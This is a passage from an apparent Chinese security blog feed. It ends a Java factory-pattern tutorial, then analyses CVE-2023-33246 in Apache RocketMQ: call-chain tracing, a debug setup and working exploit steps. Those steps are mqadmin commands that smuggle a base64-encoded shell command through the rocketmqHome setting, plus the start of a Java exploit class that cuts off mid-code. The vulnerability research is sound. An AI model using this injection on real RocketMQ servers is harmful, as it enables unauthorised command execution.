punctuation">&#123;</span>            pizza <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GreekPizza</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            pizza<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"GreekPizza"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>orderType<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"cheess"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            pizza <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CheessPizza</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            pizza<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"CheessPizza"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">//输出pizza制作过程</span>        pizza<span class="token punctuation">.</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        pizza<span class="token punctuation">.</span><span class="token function">bake</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        pizza<span class="token punctuation">.</span><span class="token function">cut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        pizza<span class="token punctuation">.</span><span class="token function">box</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> pizza<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">OrderPizza2</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//定义一个简单工厂对象</span>    <span class="token class-name">SimpleFactory</span> simpleFactory<span class="token punctuation">;</span>    <span class="token comment">//构造器</span>    <span class="token keyword">public</span> <span class="token class-name">OrderPizza2</span><span class="token punctuation">(</span><span class="token class-name">SimpleFactory</span> simpleFactory<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">setFactory</span><span class="token punctuation">(</span>simpleFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">Pizza</span> pizza <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setFactory</span><span class="token punctuation">(</span><span class="token class-name">SimpleFactory</span> simpleFactory<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> orderType <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token comment">//用户输入的</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>simpleFactory <span class="token operator">=</span> simpleFactory<span class="token punctuation">;</span><span class="token comment">//设置简单工厂对象</span>        <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>            orderType <span class="token operator">=</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            pizza <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>simpleFactory<span class="token punctuation">.</span><span class="token function">createPizza</span><span class="token punctuation">(</span>orderType<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//输出pizza制作过程</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>pizza <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                pizza<span class="token punctuation">.</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                pizza<span class="token punctuation">.</span><span class="token function">bake</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                pizza<span class="token punctuation">.</span><span class="token function">cut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                pizza<span class="token punctuation">.</span><span class="token function">box</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"订购失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//写一个方法，可以获取客户希望订购的披萨种类</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">BufferedReader</span> strin <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"input pizza type:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            str <span class="token operator">=</span> strin<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> str<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//相当于客户端</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">OrderStore</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">OrderPizza2</span> orderPizza <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OrderPizza2</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SimpleFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里和之前的区别就在于把 <code>createPizza()</code> 方法封装到了其他类里面，其实是有点像 AOP 和静态代理的思想的。</p><h2 id="0x03-工厂方法模式"><a href="#0x03-工厂方法模式" class="headerlink" title="0x03 工厂方法模式"></a>0x03 工厂方法模式</h2><p>披萨项目新的需求：客户在点披萨时，可以点不同口味的披萨，比如“北京的奶酪披萨”、“北京的胡椒披萨”或者是“伦敦的奶酪披萨”、“伦敦的胡椒披萨”。</p><p><strong>思路一</strong>：使用简单工厂模式，创建不同的简单工厂类，比如 <code>BJPizzaSimpleFactory</code>、<code>LDPizzzaSimpleFactory</code> 等等，从当前这个案例来说，也是可以的，但是考虑到项目的规模，以及软件的可维护性 、可扩展性并不是特别好。</p><p><strong>思路二</strong>：使用工厂方法模式。将披萨项目的实例化功能抽象成抽象方法，在不同口味点餐子类中具体实现。</p><p>工厂方法模式定义了一个创建对象的抽象方法，由子类决定要实例化的类。工厂方法模式将对象的实例化推迟到子类。</p><img src="/2023/07/04/Java-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/FactoryMethods.png" class=""><p>因为代码很长，这里就不一一展示的，放到 GitHub Repo 中了 </p><p><a class="link"   href="https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/Java%20%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/Java-Design-Mode" >https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/Java%20%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/Java-Design-Mode<i class="fas fa-external-link-alt"></i></a></p><p>可以看到是定义了不同的类继承 Pizza 接口，再去实现这些接口，重写了对应方法。</p><h2 id="0x03-抽象工厂模式"><a href="#0x03-抽象工厂模式" class="headerlink" title="0x03 抽象工厂模式"></a>0x03 抽象工厂模式</h2><p><strong>抽象工厂模式</strong>：定义了一个 interface 用于创建相关或有依赖关系的对象簇，而无需指明具体的类。</p><p>抽线工厂模式可以将简单工厂模式和工厂方法模式进行整合。</p><p>从设计层面看，抽象工厂模式就是对简单工厂模式的改进（或者 称为进一步的抽象）。</p><p>将工厂抽象成两层，AbsFactory（抽象工厂）具体实现的工厂子类。程序员可以根据创建对象类型使用对应的工厂子类。这样将单个的简单工厂类变成了工厂簇，更利于代码的维护。</p><img src="/2023/07/04/Java-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/AbsFactory.png" class=""><h2 id="0x04-工厂模式小结"><a href="#0x04-工厂模式小结" class="headerlink" title="0x04 工厂模式小结"></a>0x04 工厂模式小结</h2><p><strong>工厂模式的意义</strong>：将实例化对象的代码提取出来，放到一个类中统一管理和维护，达到和主项目的依赖关系的解耦，从而提高项目的扩展和维护性。</p><p><strong>三种工厂模式</strong>：简单工厂模式、工厂方法模式、抽象工厂模式。</p><p><strong>设计模式的依赖抽象原则</strong>：</p><ul><li>创建对象实例时，不要直接new类，而是把这个new类的动作放在一个工厂的方法中，并返回。有的书上说，变量不要直接持有具体类的引用；</li><li>不要让类继承具体类，而是继承抽象类或者是实现interface（接口）；</li><li>不要覆盖基类中已经实现的方法。</li></ul><p>%%%%</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Java 设计模式之工厂模式&lt;/p&gt;</summary>
    
    
    
    <category term="Java" scheme="https://drun1baby.github.io/categories/Java/"/>
    
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-33246 RocketMQ 漏洞分析</title>
    <link href="https://drun1baby.github.io/2023/06/23/CVE-2023-33246-RocketMQ-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://drun1baby.github.io/2023/06/23/CVE-2023-33246-RocketMQ-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2023-06-23T06:15:12.000Z</published>
    <updated>2023-06-30T17:15:28.332Z</updated>
    
    <content type="html"><![CDATA[<p>发一篇库存</p><span id="more"></span><p>这篇文章也发在了我们团队的公众号上：<a class="link"   href="https://mp.weixin.qq.com/s/E3IiSiIyP6So5cg-dR8PyQ" >https://mp.weixin.qq.com/s/E3IiSiIyP6So5cg-dR8PyQ<i class="fas fa-external-link-alt"></i></a></p><h1 id="CVE-2023-33246-漏洞分析"><a href="#CVE-2023-33246-漏洞分析" class="headerlink" title="CVE-2023-33246 漏洞分析"></a>CVE-2023-33246 漏洞分析</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>RocketMQ 5.1.0 及以下版本，在一定条件下，存在远程命令执行风险。RocketMQ 的 NameServer、Broker、Controller 等多个组件外网泄露，缺乏权限验证，攻击者可以利用该漏洞利用更新配置功能以 RocketMQ 运行的系统用户身份执行命令。  此外，攻击者可以通过伪造 RocketMQ 协议内容来达到同样的效果。</p><h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>Apache RocketMQ &lt;&#x3D; 5.1.0</p><h2 id="漏洞基础"><a href="#漏洞基础" class="headerlink" title="漏洞基础"></a>漏洞基础</h2><h3 id="Apache-RocketMQ"><a href="#Apache-RocketMQ" class="headerlink" title="Apache RocketMQ"></a>Apache RocketMQ</h3><p>RocketMQ 是一个开源的分布式消息中间件系统，由阿里巴巴集团开发并贡献给 Apache 软件基金会，它主要用于解决高并发、高可用的场景下的消息通信问题。</p><ul><li>说白了我觉得从应用角度来说就是第二个 Kafka</li></ul><h3 id="RocketMQ-工作流程"><a href="#RocketMQ-工作流程" class="headerlink" title="RocketMQ 工作流程"></a>RocketMQ 工作流程</h3><p>1、生产者发送消息：生产者通过调用 RocketMQ 提供的 API 向指定 Topic 发送消息，消息可以是任何格式的数据。</p><p>2、Nameserver 服务注册：Nameserver 接收到 Broker 的注册信息，并将其存储在内存中。同时，Nameserver 还记录着所有 Topic 和 Queue 的路由信息。</p><p>3、消费者订阅消息：消费者通过订阅指定的 Topic 来接收消息。消费者可以选择同步或异步方式订阅消息，也可以根据自己的需求设置消费模式。</p><p>4、Broker 接收消息：经过负载均衡后，消息被发送到 Broker 中。每个 Broker 都会缓存一定数量的消息，以便快速响应消费者的请求。</p><p>5、消费者拉取消息：消费者定期从 Broker 中拉取消息。在拉取消息时，可以根据不同的消费模式进行消息消费。消费者可以在本地进行消息处理，也可以将消息传递给其他系统进行处理。</p><p>6、消息确认：消费者在消费完消息后，需要向 Broker 发送消息确认信息。消息确认可以帮助 Broker 删除已经被消费的消息，避免重复消费。</p><p>总的来说，RocketMQ 的工作流程包括了生产者发送消息、Nameserver 注册服务、消费者订阅消息、Broker 接收消息、消费者拉取消息和消息确认等步骤。通过这些步骤，RocketMQ 能够实现高效、可靠的消息传递和处理。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><strong>docker-compose.yml</strong></p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">'2'</span><span class="token key atrule">services</span><span class="token punctuation">:</span>  <span class="token key atrule">namesrv</span><span class="token punctuation">:</span>      <span class="token key atrule">image</span><span class="token punctuation">:</span> apache/rocketmq<span class="token punctuation">:</span>4.9.4      <span class="token key atrule">container_name</span><span class="token punctuation">:</span> rmqnamesrv      <span class="token key atrule">ports</span><span class="token punctuation">:</span>        <span class="token punctuation">-</span> 9876<span class="token punctuation">:</span><span class="token number">9876</span>        <span class="token punctuation">-</span> 9555<span class="token punctuation">:</span><span class="token number">9555</span>      <span class="token key atrule">environment</span><span class="token punctuation">:</span>        <span class="token key atrule">JAVA_OPT</span><span class="token punctuation">:</span> <span class="token string">"-Xdebug -Xrunjdwp:transport=dt_socket,address=9555,server=y,suspend=n"</span>      <span class="token key atrule">command</span><span class="token punctuation">:</span> sh mqnamesrv  <span class="token key atrule">broker</span><span class="token punctuation">:</span>    <span class="token key atrule">image</span><span class="token punctuation">:</span> apache/rocketmq<span class="token punctuation">:</span>4.9.4    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> rmqbroker    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> 10909<span class="token punctuation">:</span><span class="token number">10909</span>      <span class="token punctuation">-</span> 10911<span class="token punctuation">:</span><span class="token number">10911</span>      <span class="token punctuation">-</span> 10912<span class="token punctuation">:</span><span class="token number">10912</span>      <span class="token punctuation">-</span> 9556<span class="token punctuation">:</span><span class="token number">9555</span>    <span class="token key atrule">environment</span><span class="token punctuation">:</span>        <span class="token key atrule">JAVA_OPT</span><span class="token punctuation">:</span> <span class="token string">"-Xdebug -Xrunjdwp:transport=dt_socket,address=9555,server=y,suspend=n"</span>    <span class="token key atrule">command</span><span class="token punctuation">:</span> sh mqbroker <span class="token punctuation">-</span>n namesrv<span class="token punctuation">:</span>9876 <span class="token punctuation">-</span>c ../conf/broker.conf    <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> namesrv  <span class="token key atrule">dashboard</span><span class="token punctuation">:</span>    <span class="token key atrule">image</span><span class="token punctuation">:</span> apacherocketmq/rocketmq<span class="token punctuation">-</span>dashboard    <span class="token key atrule">container_name</span><span class="token punctuation">:</span> rmqdashboard    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> 8081<span class="token punctuation">:</span><span class="token number">8081</span>    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token key atrule">JAVA_OPTS</span><span class="token punctuation">:</span> <span class="token string">"-Drocketmq.namesrv.addr=namesrv:9876"</span>    <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> namesrv<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最开始这里是先去找 namesrv 处的漏洞的，但是发现打了断点之后一直走不过去，才发现是 Broker 组件处的问题，于是又加了 Broker 组件的断点调试。</p><p>且发现 Docker 的 5.1.0 版本有些问题，一直没有 debug 排错成功。</p><h2 id="漏洞复现与分析"><a href="#漏洞复现与分析" class="headerlink" title="漏洞复现与分析"></a>漏洞复现与分析</h2><h3 id="对于漏洞描述的思考"><a href="#对于漏洞描述的思考" class="headerlink" title="对于漏洞描述的思考"></a>对于漏洞描述的思考</h3><p>再看一遍漏洞描述，越看思考越多</p><ul><li><p>RocketMQ 5.1.0 及以下版本，在一定条件下，存在远程命令执行风险。</p></li><li><p>RocketMQ 的 NameServer、Broker、Controller 等多个组件外网泄露，缺乏权限验证，攻击者可以利用该漏洞，达到更新配置功能的效果。</p></li><li><p>以 RocketMQ 运行的系统用户身份执行命令。  此外，攻击者可以通过伪造 RocketMQ 协议内容来达到同样的效果。</p></li></ul><p>本质上是两点，需要先修改配置，再 RCE</p><p>漏洞信息给的相当模糊， 我猜测可能是 RocketMQ 里面本身自带有命令执行的地方，但是需要攻击者先构造越权。</p><p>和之前的漏洞分析不太一样，我并没有找到比较明显的 diff 代码</p><p>找了非常久的 diff 代码，终于找到一处可用的</p><p><a class="link"   href="https://github.com/apache/rocketmq/commit/9d411cf04a695e7a3f41036e8377b0aa544d754d" >https://github.com/apache/rocketmq/commit/9d411cf04a695e7a3f41036e8377b0aa544d754d<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://github.com/apache/rocketmq/commit/c3ada731405c5990c36bf58d50b3e61965300703" >https://github.com/apache/rocketmq/commit/c3ada731405c5990c36bf58d50b3e61965300703<i class="fas fa-external-link-alt"></i></a> （和上面的版本，本质上是同一种东西）</p><p>这个的 diff 修复代码主要是做了一件事：不让 RocketMQ 在运行的时候能够更新 configPath，且增加了黑命单，黑名单如下</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">brokerConfigPath configStorePath kvConfigPath configStorePathName<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>后来在 4.9.6 的更新处又找到了另外一个地方</p><img src="/2023/06/23/CVE-2023-33246-RocketMQ-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/removeMoudleFilterServer.png" class=""><p><a class="link"   href="https://github.com/apache/rocketmq/commit/c469a60dcca616b077caf2867b64582795ff8bfc" >https://github.com/apache/rocketmq/commit/c469a60dcca616b077caf2867b64582795ff8bfc<i class="fas fa-external-link-alt"></i></a> （4.9.6）</p><p><a class="link"   href="https://github.com/apache/rocketmq/commit/f1b411cecc3a9c441fdec2caf5867601419f3fc0" >https://github.com/apache/rocketmq/commit/f1b411cecc3a9c441fdec2caf5867601419f3fc0<i class="fas fa-external-link-alt"></i></a> （5.1.1）</p><p>这里我们拿以前的旧版本（我是 4.9.4）去看一下 filter server 到底是什么功能点</p><img src="/2023/06/23/CVE-2023-33246-RocketMQ-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/filterServers.png" class=""><p>发现存在 <code>callShell()</code> 方法非常可疑，跟进去看一下，发现这里直接就有 <code>Runtime.getRuntime.exec()</code> 写出来了</p><img src="/2023/06/23/CVE-2023-33246-RocketMQ-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/runtimeExec.png" class=""><p>结合前面的 <code>callShell()</code> 方法，最终找到一条可以利用的调用链，因为在 RocketMQ 中，<code>startBasicService</code> 这个方法很可能是每时每刻都在进行的</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">BrokerController</span>#startBasicService ——<span class="token operator">></span> <span class="token class-name">FilterServerManager</span>#start ——<span class="token operator">></span> <span class="token class-name">FilterServerManager</span>#createFilterServer ——<span class="token operator">></span> <span class="token class-name">FilterServerUtil</span>#callShell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="漏洞利用与漏洞分析"><a href="#漏洞利用与漏洞分析" class="headerlink" title="漏洞利用与漏洞分析"></a>漏洞利用与漏洞分析</h3><p>从漏洞利用角度来说很简单了，这里我们开启远程调试，并且在有 RocketMQ 的机子上开启另外一台 RocketMQ 主机来测试，因为这样可以保证控制变量，也不会有自己打自己的错觉。</p><p>通过以下命令开启另外一台 RocketMQ，这里本质上不会启动 RocketMQ 的服务，只是用一下里面的 jar 包等环境</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run <span class="token parameter variable">--rm</span> <span class="token parameter variable">-ti</span> apache/rocketmq:4.9.4 <span class="token function">bash</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过翻阅官方文档这里可以知道更新配置的操作是通过 <code>./mqadmin</code> 这个命令来完成的</p><p><a class="link"   href="https://rocketmq.apache.org/zh/docs/4.x/deployment/02admintool/" >https://rocketmq.apache.org/zh/docs/4.x/deployment/02admintool/<i class="fas fa-external-link-alt"></i></a></p><p>因为漏洞代码是走到 <code>Broker</code> 这个组件相对应的功能里面去的，所以使用 <code>./mqadmin</code> 命令后接 <code>updateBrokerConfig</code> 是我认为正确的利用姿势，先构造一个简单的 test 案例</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./mqadmin updateBrokerConfig <span class="token parameter variable">-k</span> key <span class="token parameter variable">-v</span> <span class="token function">whoami</span> <span class="token parameter variable">-n</span> <span class="token number">124.222</span>.21.138:9876<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是这一个 test 案例并没有走到对应的 <code>FilterServerUtil#callShell</code> 方法里面去，但是断点里面出现了这一段内容，这也就证明了这个 <code>BrokerController</code> 是会自动运行的（因为这里 more &#x3D; 0，所以会抛出异常）</p><img src="/2023/06/23/CVE-2023-33246-RocketMQ-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/debugPointContent.png" class=""><p>这时候再回来看一看 cmd 到底是怎么构造出来的 —— 去到 <code>FilterServerManager.buildStartCommand()</code> 方法下断点调试</p><p>第一个参数是 <code>BrokerStartup.configFile</code>，也就是配置文件，第二个参数是要去更新的 NamesrvAddr，第三个参数为 rocketHome 的路径</p><img src="/2023/06/23/CVE-2023-33246-RocketMQ-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/threeParameters.png" class=""><p>这三者最终形成了 <code>String cmd = this.buildStartCommand();</code> 里的 cmd 变量，形象化地说明一下就是这样</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">sh <span class="token punctuation">&#123;</span>para3<span class="token punctuation">&#125;</span><span class="token operator">/</span>bin<span class="token operator">/</span>startfsrv<span class="token punctuation">.</span>sh <span class="token operator">-</span>c <span class="token punctuation">&#123;</span>para1<span class="token punctuation">&#125;</span> <span class="token operator">-</span>n <span class="token punctuation">&#123;</span>para2<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以从构造攻击的角度来说我们最好是让 <code>para3</code> 可控，构造类似于 <code>sh evil_cmd;/bin/startfsrv.sh -c &#123;para1&#125; -n &#123;para2&#125;</code> 即可达到命令执行的目的。</p><p>这里其实还有一点需要绕过，就是 <code>getFilterServerNums</code> 这里最初的值是 0，我们需要让它变成大于 0 即可，这一点其实很容易实现，还是可以通过之前的 <code>./mqadmin</code> 命令来完成。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">.</span>/mqadmin updateBrokerConfig <span class="token operator">-</span>kfilterServerNums <span class="token operator">-</span>v1 <span class="token operator">-</span>b124<span class="token punctuation">.</span><span class="token number">222.21</span><span class="token number">.138</span><span class="token operator">:</span><span class="token number">10911</span> <span class="token operator">-</span>n <span class="token number">124.222</span><span class="token number">.21</span><span class="token number">.138</span><span class="token operator">:</span><span class="token number">9876</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如此操作之后，就能够让代码走进 <code>callShell()</code> 的逻辑</p><img src="/2023/06/23/CVE-2023-33246-RocketMQ-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/intoCallShell.png" class=""><p>并且在这里，通过 <code>cmdArray</code> 变量可以看到，确实我们需要控制 <code>para3</code> 去进行命令执行</p><img src="/2023/06/23/CVE-2023-33246-RocketMQ-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/intoRuntime.png" class=""><p>构造 EXP</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./mqadmin updateBrokerConfig <span class="token parameter variable">-krocketmqHome</span> -v<span class="token string">'-c &#123;echo,dG91Y2ggL3RtcC9zdWNjZXNzCg==&#125;|&#123;base64,-d&#125;|bash -c"" '</span>  -b124.222.21.138:10911 <span class="token parameter variable">-n</span> <span class="token number">124.222</span>.21.138:9876<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/06/23/CVE-2023-33246-RocketMQ-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/exp.png" class=""><p>命令执行成功！</p><img src="/2023/06/23/CVE-2023-33246-RocketMQ-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/rocketConfig.png" class=""><img src="/2023/06/23/CVE-2023-33246-RocketMQ-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/success.png" class=""><p>如果说需要扩大攻击面的话，我们尝试用 Java 打 RocketMQ 的 RCE</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>rocketmq<span class="token punctuation">.</span>tools<span class="token punctuation">.</span>admin<span class="token punctuation">.</span></span><span class="token class-name">DefaultMQAdminExt</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Properties</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EXP</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span>args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token comment">// 创建 Properties 对象</span>        <span class="token class-name">Properties</span> props <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"rocketmqHome"</span><span class="token punctuation">,</span><span class="token string">"-c &#123;echo,dG91Y2ggL3RtcC9mbGFn&#125;|&#123;base64,-d&#125;|bash -c"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"filterServerNums"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 创建 DefaultMQAdminExt 对象并启动</span>        <span class="token class-name">DefaultMQAdminExt</span> admin <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token 